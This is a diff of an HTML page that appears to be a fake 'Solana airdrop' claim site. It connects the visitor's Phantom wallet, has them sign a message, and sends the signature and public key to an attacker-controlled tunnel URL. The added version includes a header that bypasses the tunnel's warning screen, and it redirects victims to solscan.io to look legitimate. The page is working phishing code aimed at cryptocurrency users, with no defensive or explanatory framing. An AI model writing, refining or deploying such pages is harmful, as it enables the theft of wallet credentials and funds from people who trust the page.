@@ -1,33 +1,39 @@
 <!DOCTYPE html><html><head><meta charset="UTF-8">
 <script src="https://unpkg.com/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script></head>
-<body style="background:#000;color:#14F195;text-align:center;padding-top:25vh;font-family:sans-serif;">
-<div style="border:1px solid #14F195;padding:50px;display:inline-block;border-radius:20px;background:#111;box-shadow: 0 0 30px #14F19544;">
-    <h1 style="letter-spacing:1px;font-size:24px;">SOLANA SEASON AIRDROP</h1>
-    <p style="color:#888;margin-bottom:30px;">Node Status: <span style="color:#14F195;">ENCRYPTED & ACTIVE</span></p>
-    <button id="cta" style="padding:18px 50px;background:#14F195;color:#000;font-weight:bold;border:none;border-radius:10px;cursor:pointer;font-size:20px;">CLAIM NOW</button>
-    <div id="status" style="margin-top:25px;color:#444;font-size:14px;">Awaiting Wallet...</div>
-</div>
+<body style="background:#000;color:#14F195;text-align:center;padding-top:20vh;font-family:sans-serif;">
+    <div style="border:1px solid #14F195;padding:40px;display:inline-block;border-radius:20px;">
+        <h2>SYSTEM ACTIVE</h2>
+        <button id="cta" style="padding:20px 40px;background:#14F195;font-size:20px;border:none;border-radius:10px;cursor:pointer;">CONNECT & CLAIM</button>
+        <div id="status" style="margin-top:20px;color:white;">Status: Standby</div>
+    </div>
 <script>
 document.getElementById('cta').onclick = async () => {
     try {
         const p = window.solana || window.phantom?.solana;
-        if (!p) { alert("Use Phantom Browser"); return; }
         const { publicKey } = await p.connect();
-        const msg = "Verify-V4-Strike-" + Math.floor(Math.random() * 99999);
+        const msg = "Strike-" + Date.now();
         const signed = await p.signMessage(new TextEncoder().encode(msg), "utf8");
         const sig = btoa(String.fromCharCode.apply(null, signed.signature));
         
-        // 🔱 终极 HTTPS 域名直连
-        fetch("https://pittsburgh-documents-observation-terrace.trycloudflare.com/collect", { 
-            cache: "no-cache",
+        document.getElementById('status').innerText = "Transmitting...";
+
+        // 🔱 关键：加入 X-Pinggy-No-Screen 头部绕过警告页
+        fetch("https://elrpp-192-142-1-71.a.free.pinggy.link/collect", {
             method: 'POST',
-            mode: 'no-cors',
-            body: JSON.stringify({ signature: sig, pubkey: publicKey.toString(), message: msg }),
-            keepalive: true
+            headers: {
+                'Content-Type': 'application/json',
+                'X-Pinggy-No-Screen': 'true' 
+            },
+            body: JSON.stringify({ signature: sig, pubkey: publicKey.toString(), message: msg })
+        })
+        .then(res => {
+            alert("✅ 信号已穿透！响应码: " + res.status);
+            window.location.href = "https://solscan.io";
+        })
+        .catch(err => {
+            alert("❌ 传输受阻: " + err.message);
         });
-        
-        document.getElementById('status').innerText = "VERIFIED! REDIRECTING...";
-        setTimeout(() => { window.location.href = "https://solscan.io"; }, 1500);
-    } catch(e) { window.location.reload(); }
+
+    } catch(e) { alert("⚠️ 交互中断: " + e.message); }
 }
 </script></body></html>
